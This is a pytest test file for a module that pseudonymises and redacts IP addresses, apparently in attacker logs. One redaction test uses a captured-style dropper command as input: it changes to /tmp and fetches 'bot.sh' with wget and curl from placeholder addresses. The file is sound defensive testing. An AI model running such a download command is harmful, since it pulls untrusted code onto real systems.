"""Tests for pseudonymisation. Addresses are from documentation and shared ranges."""

from __future__ import annotations

import pytest

from aegis.governance.pseudonymise import (
    KEY_ENV,
    PseudonymisationKeyError,
    find_ipv4,
    load_key,
    pseudonymise_ip,
    redact_ips,
)

KEY = b"k" * 32
OTHER_KEY = b"z" * 32


class TestPseudonymise:
    def test_same_address_same_pseudonym(self) -> None:
        """Repeat visits by one attacker must stay countable."""
        assert pseudonymise_ip("198.51.100.7", KEY) == pseudonymise_ip(" 198.51.100.7 ", KEY)

    def test_different_addresses_differ(self) -> None:
        assert pseudonymise_ip("198.51.100.7", KEY) != pseudonymise_ip("198.51.100.8", KEY)

    def test_depends_on_the_key(self) -> None:
        """Without the key, the pseudonym cannot be recomputed by trying every IPv4 address."""
        assert pseudonymise_ip("198.51.100.7", KEY) != pseudonymise_ip("198.51.100.7", OTHER_KEY)

    def test_output_contains_no_address(self) -> None:
        value = pseudonymise_ip("198.51.100.7", KEY)
        assert value.startswith("anon-") and len(value) == 21
        assert find_ipv4(value) == []

    def test_ipv6_is_supported(self) -> None:
        assert pseudonymise_ip("2001:db8::1", KEY).startswith("anon-")

    def test_non_address_is_rejected(self) -> None:
        with pytest.raises(ValueError):
            pseudonymise_ip("not-an-ip", KEY)


class TestKey:
    def test_missing_key_is_none(self) -> None:
        assert load_key({}) is None

    def test_short_key_is_refused(self) -> None:
        with pytest.raises(PseudonymisationKeyError, match="at least 32"):
            load_key({KEY_ENV: "too-short"})

    def test_long_enough_key_is_returned(self) -> None:
        assert load_key({KEY_ENV: "x" * 40}) == b"x" * 40


class TestRedaction:
    def test_addresses_inside_commands_are_redacted(self) -> None:
        command = "cd /tmp; wget http://100.64.1.2/bot.sh; curl 203.0.113.9:8080/x"
        assert redact_ips(command) == "cd /tmp; wget http://[ip]/bot.sh; curl [ip]:8080/x"

    def test_version_strings_are_left_alone(self) -> None:
        for text in ("SSH-2.0-OpenSSH_9.2p1", "busybox 1.36.1", "1.2.3.4.5", "999.1.1.1"):
            assert redact_ips(text) == text

    def test_none_passes_through(self) -> None:
        assert redact_ips(None) is None

    def test_find_reports_only_valid_addresses(self) -> None:
        assert find_ipv4("from 100.64.0.1 not 300.1.1.1 or v1.2.3.4.5") == ["100.64.0.1"]
